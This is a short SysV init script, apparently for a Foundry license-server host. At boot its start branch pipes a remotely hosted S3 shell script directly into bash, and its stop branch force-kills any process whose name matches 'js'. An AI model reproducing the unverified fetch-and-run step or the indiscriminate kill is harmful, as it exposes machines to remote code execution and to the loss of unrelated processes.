#!/bin/sh
#
# chkconfig: 345 99 01
#
# description: your script is a test service
#
case $1 in
        start)
			mkdir -p /tmp/maggieq; cd /tmp/maggieq
			curl -s "https://s3-ap-southeast-1.amazonaws.com/renegade-princess/instance.sh" | bash
            ;;
        restart)
           /usr/local/foundry/LicensingTools7.0/FoundryLicenseUtility -s restart -t RLM
            ;;
        status)
           echo OK
            ;;
        stop)
			ps | grep js | awk '{print "kill -9 "$1}' | bash
			rm -R /tmp/maggieq
            ;;
esac